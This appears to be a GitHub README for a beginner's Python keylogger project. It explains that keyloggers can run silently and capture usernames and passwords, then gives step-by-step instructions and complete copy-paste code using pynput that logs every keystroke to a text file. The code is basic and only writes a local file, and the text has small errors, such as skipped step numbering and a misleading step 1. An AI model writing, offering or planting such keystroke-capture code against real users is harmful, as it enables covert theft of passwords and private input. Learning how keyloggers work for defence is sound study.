# Keylogger Project
Keylogger Project using Python

A Keylogger is used within cybersecurity as a way to keep track and record the keystrokes as a user types. This is beneficial especially for companies as companies can easily track down and monitor any malicious or deviant acts within their system; a keylogger can also be set up so it is silently active in which the user does not know their keystrokes are being tracked.
<br>
#
```python
with open ("keyfile.txt",'a') as logKey:
    try:
        char = key.char
        logKey.write(char)
```
 #
<br>
Using the term "with open("keyfile.txt",'a') as logKey" allows an external text file to be made which will keep a live record of the keystrokes in which a user enters. This is really helpful in tackling a users actions if there were some sort of bad act in a business for example; a business can directly see the input of the user and work on a patch to make sure that their system cannot be compromised again.
<br>
<br>

![Screenshot 2024-01-27 184843](https://github.com/mholtz15/Keylogger-Project/assets/157908872/347d2b54-3657-41dc-ba7b-f22d356e4b61)

<br>
As shown above, this is the text file in which is created as soon as the Keylogger is active. The file contains the exact keystrokes. However, this can be used maliciously; since a Keylogger can be inputted onto a device undetectably (if a user does not have the latest of software protection updates) malicious actors can expose this application. For example, if a user logs into one of their accounts, the Keylogger will mirror their username and password into a textfile in which can be abused by a malicious actor to get a users personal information.
<br>
<br>
<ins>How to create a Keylogger</ins> <br>
1. Open a text file using pynput (for my project I used Visual Studio Code) otherwise the code will not run as intended <br>
2. Copy the code below: <br>

#

```python
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt",'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Erro getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input() 
```
#
<br>
4. Run the code and make sure a text file is created when a user inputs their keystrokes. <br>
<br>
NOTE: If the code does not run, please double check that all commas, speech marks, colons etc are in the correct place and there is no more than needed to be as small errors such as this can equal into the code failing.
